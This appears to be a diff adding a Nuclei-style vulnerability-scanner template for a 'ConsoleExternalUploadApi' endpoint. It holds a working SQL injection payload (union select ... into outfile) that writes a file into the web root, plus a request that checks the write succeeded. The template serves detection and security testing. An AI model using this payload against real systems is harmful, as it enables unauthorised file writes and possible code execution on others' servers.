@@ -1,0 +1,44 @@
+id: gwt-system-consoleexternaluploadapi-rce
+
+info:
+  name: Vulnerability in ConsoleExternalUploadApi leading to Arbitrary File Write
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-write,rce
+  description: |
+    Exploits a SQL injection vulnerability in ConsoleExternalUploadApi that allows arbitrary file write.
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+  t1: "{{rand_int(100, 1000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: sql-injection-file-write
+    method: POST
+    path:
+      - "{{BaseURL}}/ConsoleExternalUploadApi.XGI"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      key=ServerIPType'+union+select+'test{{t1}}'+into+outfile+'..\\..\\WebRoot\\{{filename}}.xgi&initParams=x&sign=x
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "\"result\":0"
+
+  - id: verify-file-write
+    method: GET
+    path:
+      - "{{BaseURL}}/{{filename}}.xgi"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "{{t1}}"
